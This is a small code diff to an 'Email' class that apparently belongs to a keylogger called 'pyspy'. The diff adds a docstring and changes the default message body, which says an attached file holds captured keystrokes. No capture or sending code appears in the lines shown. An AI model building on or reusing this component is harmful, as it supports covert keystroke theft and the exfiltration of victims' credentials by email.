@@ -6,6 +6,10 @@ class Email:
     Class used to send emails using a specified email domain
     """
     def __init__(self, my_email, to_email):
+        """
+        my_email: email of the sender
+        to_email: email of the recipient
+        """
         self.my_email = my_email  # sender
         self.to_email = to_email  # recepient email
 
@@ -21,7 +25,7 @@ class Email:
             attachments=filename
         )
     
-    def send_email(self, this_subj="Current Log run", body="See the attached doc for keystrokes"):
+    def send_email(self, this_subj="Current Log run", body="See the attached doc for keystrokes\n-sent from pyspy"):
         """
         Sends email to the specified reciever email
         """
